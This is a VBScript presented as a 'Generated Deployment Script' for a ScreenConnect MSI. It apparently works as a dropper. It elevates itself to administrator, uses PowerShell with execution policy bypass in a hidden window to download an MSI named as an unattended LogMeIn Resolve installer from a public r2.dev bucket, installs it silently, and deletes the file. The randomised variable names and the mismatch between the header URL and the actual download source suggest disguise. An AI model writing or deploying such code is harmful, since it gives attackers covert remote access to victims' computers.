' Generated Deployment Script – MSI
' URL: https://devltainc14.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
Option Explicit

Dim KNbLbICu, OYEGMXLm, IgOYcJ, osJHol, UuawuXUA

Set KNbLbICu = CreateObject("WScript.Shell")
Set OYEGMXLm = CreateObject("Scripting.FileSystemObject")

' Request elevation if not already running as administrator
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, _
        """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
    WScript.Quit
End If

' Resolve %TEMP% and build the full installer path
IgOYcJ = KNbLbICu.ExpandEnvironmentStrings("%TEMP%")
osJHol = IgOYcJ & "\" & "installer953.msi"

' Download the installer via PowerShell (hidden window, wait for completion)
UuawuXUA = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & "(New-Object Net.WebClient).DownloadFile(" & Chr(39) & "https://pub-1130aa4424c2442380aac805cfdda1ec.r2.dev/LogMeInResolve_Unattended.msi" & Chr(39) & "," & Chr(39) & osJHol & Chr(39) & ")" & Chr(34)
KNbLbICu.Run UuawuXUA, 0, True

' Verify download — abort if file is missing or zero bytes
If Not OYEGMXLm.FileExists(osJHol) Then WScript.Quit 1
If OYEGMXLm.GetFile(osJHol).Size = 0 Then
    On Error Resume Next
    OYEGMXLm.DeleteFile osJHol
    On Error GoTo 0
    WScript.Quit 1
End If

' Run the MSI silently (msiexec manages its own UI; hidden window is fine)
UuawuXUA = "msiexec /i " & Chr(34) & osJHol & Chr(34) & " /qn /norestart"
KNbLbICu.Run UuawuXUA, 0, True

' Wait briefly for any cleanup processes, then remove the temp file
WScript.Sleep 6000
On Error Resume Next
OYEGMXLm.DeleteFile osJHol
On Error GoTo 0

Set KNbLbICu = Nothing
Set OYEGMXLm = Nothing
